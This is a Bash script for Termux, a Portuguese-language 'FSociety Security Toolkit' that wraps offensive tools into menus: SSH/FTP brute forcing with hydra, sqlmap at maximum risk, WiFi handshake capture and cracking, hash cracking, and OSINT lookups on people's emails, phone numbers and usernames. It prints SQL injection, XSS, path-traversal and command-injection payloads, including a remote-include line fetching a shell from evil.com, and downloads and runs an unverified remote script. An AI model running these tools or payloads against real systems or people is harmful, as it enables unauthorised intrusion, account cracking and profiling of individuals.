#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

install_dependencies() {
    echo -e "${YELLOW}[*] Verificando dependências...${NC}"
    pkgs=("python3" "wget" "curl" "nmap" "git" "ruby" "php" "openssh")
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &> /dev/null; then
            echo -e "${BLUE}[+] Instalando $pkg...${NC}"
            pkg install -y "$pkg" || {
                echo -e "${RED}[!] Falha ao instalar $pkg${NC}"
                exit 1
            }
        fi
    done
    
    pip_pkgs=("requests" "beautifulsoup4" "scapy" "python-whois")
    for pip_pkg in "${pip_pkgs[@]}"; do
        if ! python3 -c "import $pip_pkg" &> /dev/null; then
            echo -e "${BLUE}[+] Instalando $pip_pkg via pip...${NC}"
            pip install "$pip_pkg" || {
                echo -e "${RED}[!] Falha ao instalar $pip_pkg${NC}"
                exit 1
            }
        fi
    done
}

main_menu() {
    clear
    echo -e "${RED}"
    echo "   _____ _____ _____ _____ _____ _____ _____ "
    echo "  |  ___|  _  |     |   __|   __|_   _|   __|"
    echo "  |  _||     | | | |  |  |__   |  | | |   __|"
    echo "  |_|  |__|__|_|_|_|_____|_____|  |_| |_____|"
    echo -e "${BLUE}"
    echo "         FSociety Security Toolkit v3.1"
    echo "      Advanced Security Assessment"
    echo -e "${NC}"
    echo -e "${YELLOW}1.${NC} Scanner de Vulnerabilidades"
    echo -e "${YELLOW}2.${NC} Ferramentas de Ataque"
    echo -e "${YELLOW}3.${NC} Ferramentas OSINT"
    echo -e "${YELLOW}4.${NC} Database de Exploits"
    echo -e "${YELLOW}5.${NC} Ferramentas de Proteção"
    echo -e "${YELLOW}6.${NC} Instalar Todas as Ferramentas"
    echo -e "${YELLOW}7.${NC} Sair"
    echo -e ""
    read -p "Selecione uma opção: " choice

    case $choice in
        1) vulnerability_scanner ;;
        2) attack_tools ;;
        3) osint_tools ;;
        4) exploits_db ;;
        5) protection_tools ;;
        6) install_all ;;
        7) exit 0 ;;
        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; main_menu ;;
    esac
}

vulnerability_scanner() {
    clear
    echo -e "${GREEN}"
    echo "   ___ _____ _   _ _____ _____ _____ _____ _   _ _____ "
    echo "  |_  |  _  | | | |  ___|  ___|  _  |_   _| | | |  ___|"
    echo "    | | | | | | | | |__ | |__ | | | | | | | | | | |__  "
    echo "    | | | | | | | |  __||  __|| | | | | | | | | |  __| "
    echo "/\__/ \ \_/ / |_| | |___| |___\ \_/ /_| |_| |_| | |___ "
    echo "\____/ \___/ \___/\____/\____/ \___/ \___/ \___/\____/ "
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Scanner Básico de Portas"
    echo -e "${YELLOW}2.${NC} Verificar Vulnerabilidades Web"
    echo -e "${YELLOW}3.${NC} Scanner de Serviços Vulneráveis"
    echo -e "${YELLOW}4.${NC} Verificar Headers de Segurança"
    echo -e "${YELLOW}5.${NC} Voltar ao Menu Principal"
    
    read -p "Selecione uma opção: " vuln_choice
    
    case $vuln_choice in
        1)
            read -p "Digite o IP ou domínio para scanear: " target
            echo -e "${BLUE}[*] Iniciando scan de portas...${NC}"
            nmap -sV "$target"
            ;;
        2)
            read -p "Digite a URL do site (ex: http://exemplo.com): " url
            echo -e "${BLUE}[*] Verificando vulnerabilidades web...${NC}"
            curl -s -I "$url" | grep -i "server\|x-powered-by"
            python3 -c "import requests; print('\nHeaders:', requests.get('$url').headers)"
            ;;
        3)
            read -p "Digite o IP para verificar serviços vulneráveis: " ip
            echo -e "${BLUE}[*] Procurando serviços vulneráveis...${NC}"
            nmap --script vuln "$ip"
            ;;
        4)
            read -p "Digite a URL para verificar headers: " url
            echo -e "${BLUE}[*] Analisando headers de segurança...${NC}"
            curl -s -I "$url" | grep -i "strict-transport-security\|x-frame-options\|x-xss-protection\|x-content-type-options"
            ;;
        5) main_menu ;;
        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; vulnerability_scanner ;;
    esac
    
    read -p "Pressione Enter para continuar..."
    vulnerability_scanner
}

attack_tools() {
    clear
    echo -e "${RED}"
    echo "   ___ _____ _____ _____ _  _______ _____ _   _ _____ "
    echo "  / _ \_   _|_   _|_   _| |/ /_   _|_   _| | | |  ___|"
    echo " / /_\ \| |   | |   | | | ' /  | |   | | | |_| | |__  "
    echo " |  _  || |   | |   | | |  <   | |   | | |  _  |  __| "
    echo " | | | || |  _| |_  | | | . \ _| |_ _| |_| | | | |___ "
    echo " \_| |_/\_/  \___/  \_/ \_|\_\___/ \___/\_| |_/____/ "
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Metasploit Framework"
    echo -e "${YELLOW}2.${NC} Hydra (Força Bruta)"
    echo -e "${YELLOW}3.${NC} SQLmap (SQL Injection)"
    echo -e "${YELLOW}4.${NC} Aircrack-ng (WiFi)"
    echo -e "${YELLOW}5.${NC} John the Ripper (Quebra Senhas)"
    echo -e "${YELLOW}6.${NC} Voltar ao Menu Principal"
    
    read -p "Selecione uma opção: " attack_choice
    
    case $attack_choice in
        1)
            if [ -f "metasploit.sh" ]; then
                echo -e "${BLUE}[*] Iniciando Metasploit...${NC}"
                ./metasploit.sh
            else
                echo -e "${YELLOW}[*] Baixando Metasploit...${NC}"
                wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
                chmod +x metasploit.sh
                ./metasploit.sh
            fi
            ;;
        2)
            read -p "Digite o IP alvo: " target
            read -p "Serviço (ssh/ftp/http): " service
            read -p "Usuário ou lista de usuários: " user
            read -p "Senha ou lista de senhas: " pass
            echo -e "${BLUE}[*] Iniciando ataque de força bruta...${NC}"
            hydra -l "$user" -p "$pass" "$target" "$service"
            ;;
        3)
            read -p "Digite a URL vulnerável: " url
            echo -e "${BLUE}[*] Iniciando SQLmap...${NC}"
            sqlmap -u "$url" --risk=3 --level=5 --batch
            ;;
        4)
            echo -e "${BLUE}1. Capturar handshake"
            echo "2. Quebrar handshake"
            read -p "Selecione uma opção: " wifi_choice
            
            case $wifi_choice in
                1)
                    echo -e "${YELLOW}[*] Coloque sua interface em modo monitor...${NC}"
                    airmon-ng start wlan0
                    airodump-ng wlan0mon
                    ;;
                2)
                    read -p "Arquivo .cap: " cap_file
                    read -p "Wordlist: " wordlist
                    aircrack-ng "$cap_file" -w "$wordlist"
                    ;;
                *) echo -e "${RED}[!] Opção inválida!${NC}" ;;
            esac
            ;;
        5)
            read -p "Arquivo hash: " hash_file
            echo -e "${BLUE}[*] Iniciando John the Ripper...${NC}"
            john --format=raw-md5 "$hash_file"
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; attack_tools ;;
    esac
    
    read -p "Pressione Enter para continuar..."
    attack_tools
}

osint_tools() {
    clear
    echo -e "${BLUE}"
    echo "   ___  _____ _   _ _____ _____ _____ "
    echo "  / _ \|  _  | \ | |_   _|_   _|_   _|"
    echo " / /_\ \ | | |  \| | | |   | |   | |  "
    echo " |  _  \ | | | . \` | | |   | |   | |  "
    echo " | | | \ \_/ / |\  |_| |_  | |  _| |_ "
    echo " \_| |_/\___/\_| \_/\___/  \_/  \___/ "
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Consulta de Email (Have I Been Pwned)"
    echo -e "${YELLOW}2.${NC} Consulta de Telefone (PhoneInfoga)"
    echo -e "${YELLOW}3.${NC} Busca por Username (Sherlock)"
    echo -e "${YELLOW}4.${NC} Analisador de Metadados"
    echo -e "${YELLOW}5.${NC} Verificação de Domínio"
    echo -e "${YELLOW}6.${NC} Voltar ao Menu Principal"
    
    read -p "Selecione uma opção: " osint_choice
    
    case $osint_choice in
        1)
            read -p "Digite o email: " email
            echo -e "${BLUE}[*] Verificando vazamentos...${NC}"
            curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | python3 -m json.tool
            ;;
        2)
            read -p "Digite o número com código do país: " phone
            echo -e "${BLUE}[*] Analisando número...${NC}"
            python3 -c "import phonenumbers; from phonenumbers import carrier, geocoder; num = phonenumbers.parse('$phone'); print('Operadora:', carrier.name_for_number(num, 'pt')); print('Região:', geocoder.description_for_number(num, 'pt')); print('Válido:', phonenumbers.is_valid_number(num))"
            ;;
        3)
            read -p "Digite o username: " username
            echo -e "${BLUE}[*] Buscando em redes sociais...${NC}"
            if ! command -v sherlock &> /dev/null; then
                echo -e "${YELLOW}[*] Instalando Sherlock...${NC}"
                git clone https://github.com/sherlock-project/sherlock.git
                cd sherlock && pip install -r requirements.txt
                python3 sherlock.py "$username"
                cd ..
            else
                sherlock "$username"
            fi
            ;;
        4)
            read -p "Digite o caminho do arquivo: " file
            echo -e "${BLUE}[*] Extraindo metadados...${NC}"
            exiftool "$file"
            ;;
        5)
            read -p "Digite o domínio: " domain
            echo -e "${BLUE}[*] Coletando informações...${NC}"
            whois "$domain"
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; osint_tools ;;
    esac
    
    read -p "Pressione Enter para continuar..."
    osint_tools
}

exploits_db() {
    clear
    echo -e "${RED}"
    echo "  _____ _____ _____ _   _ _____ __  __ _____ _    _ _____ "
    echo " |  _  |  _  |_   _| | | |  _  |  \/  |_   _| |  | |  _  |"
    echo " | | | | | | | | | | |_| | | | | .  . | | | | |  | | | | |"
    echo " | | | | | | | | | |  _  | | | | |\/| | | | | |/\| | | | |"
    echo " | |/ /| |/ / _| |_| | | | |/ /| |  | |_| |_\  /\  / |/ / "
    echo " |___/ |___/  \___/\_| |_/___/ \_|  |_/\___/ \/  \/|___/  "
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} SQL Injection Payloads"
    echo -e "${YELLOW}2.${NC} XSS Payloads"
    echo -e "${YELLOW}3.${NC} LFI/RFI Payloads"
    echo -e "${YELLOW}4.${NC} Comandos Injection"
    echo -e "${YELLOW}5.${NC} Proteção Contra Falhas"
    echo -e "${YELLOW}6.${NC} Voltar ao Menu Principal"
    
    read -p "Selecione uma opção: " exploit_choice
    
    case $exploit_choice in
        1)
            echo -e "${BLUE}[*] SQLi Payloads:${NC}"
            echo "' OR 1=1 --"
            echo "admin'--"
            echo "1' ORDER BY 1--"
            echo "1' UNION SELECT null,table_name FROM information_schema.tables--"
            ;;
        2)
            echo -e "${BLUE}[*] XSS Payloads:${NC}"
            echo "<script>alert(1)</script>"
            echo "<img src=x onerror=alert(1)>"
            echo "\";alert(1);//"
            ;;
        3)
            echo -e "${BLUE}[*] LFI/RFI Payloads:${NC}"
            echo "../../../../etc/passwd"
            echo "php://filter/convert.base64-encode/resource=index.php"
            echo "http://evil.com/shell.txt"
            ;;
        4)
            echo -e "${BLUE}[*] Command Injection:${NC}"
            echo ";id"
            echo "|ls -la"
            echo "`whoami`"
            ;;
        5)
            echo -e "${GREEN}[*] Medidas de Proteção:${NC}"
            echo "1. Use Prepared Statements"
            echo "2. Validar/Sanitizar inputs"
            echo "3. WAF (ModSecurity)"
            echo "4. Headers de Segurança"
            echo "5. Atualizações Regulares"
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; exploits_db ;;
    esac
    
    read -p "Pressione Enter para continuar..."
    exploits_db
}

protection_tools() {
    clear
    echo -e "${GREEN}"
    echo "  ___ ___ _____ ___   ___ _____ ___ ___ _____ ___ "
    echo " | _ \ _ \_   _/ _ \ / __|_   _| _ \_ _|_   _/ _ \"
    echo " |  _/   / | || (_) | (__  | | |   /| |  | || (_) |"
    echo " |_| |_|_\ |_| \___/ \___| |_| |_|_\___| |_| \___/"
    echo -e "${NC}"
    
    echo -e "${YELLOW}1.${NC} Verificar Portas Abertas"
    echo -e "${YELLOW}2.${NC} Testar Headers de Segurança"
    echo -e "${YELLOW}3.${NC} Analisar Vulnerabilidades Web"
    echo -e "${YELLOW}4.${NC} Gerar Senha Segura"
    echo -e "${YELLOW}5.${NC} Verificar Vazamentos de Email"
    echo -e "${YELLOW}6.${NC} Voltar ao Menu Principal"
    
    read -p "Selecione uma opção: " protect_choice
    
    case $protect_choice in
        1)
            echo -e "${BLUE}[*] Portas abertas locais:${NC}"
            netstat -tuln
            ;;
        2)
            read -p "Digite a URL: " url
            echo -e "${BLUE}[*] Verificando headers...${NC}"
            curl -s -I "$url" | grep -i "strict-transport-security\|x-frame-options\|x-xss-protection\|x-content-type-options"
            ;;
        3)
            read -p "Digite a URL: " url
            echo -e "${BLUE}[*] Analisando vulnerabilidades...${NC}"
            nikto -h "$url"
            ;;
        4)
            echo -e "${BLUE}[*] Gerando senha segura:${NC}"
            openssl rand -base64 16
            ;;
        5)
            read -p "Digite o email: " email
            echo -e "${BLUE}[*] Verificando vazamentos...${NC}"
            curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | python3 -m json.tool
            ;;
        6) main_menu ;;
        *) echo -e "${RED}[!] Opção inválida!${NC}"; sleep 1; protection_tools ;;
    esac
    
    read -p "Pressione Enter para continuar..."
    protection_tools
}

install_all() {
    echo -e "${YELLOW}[*] Instalando todas as ferramentas...${NC}"
    
    pkg install -y nmap hydra sqlmap aircrack-ng john
    
    pip3 install sherlock phonenumbers
    wget https://github.com/sundowndev/phoneinfoga/releases/download/v2.0.8/phoneinfoga_$(uname -s)_$(uname -m).tar.gz
    tar xvf phoneinfoga_*.tar.gz
    mv phoneinfoga /data/data/com.termux/files/usr/bin/
    
    wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
    chmod +x metasploit.sh
    
    echo -e "${GREEN}[+] Todas as ferramentas foram instaladas!${NC}"
    sleep 2
    main_menu
}

if [ "$(id -u)" -eq 0 ]; then
    echo -e "${RED}[!] Não execute como root!${NC}"
    exit 1
fi

install_dependencies
main_menu
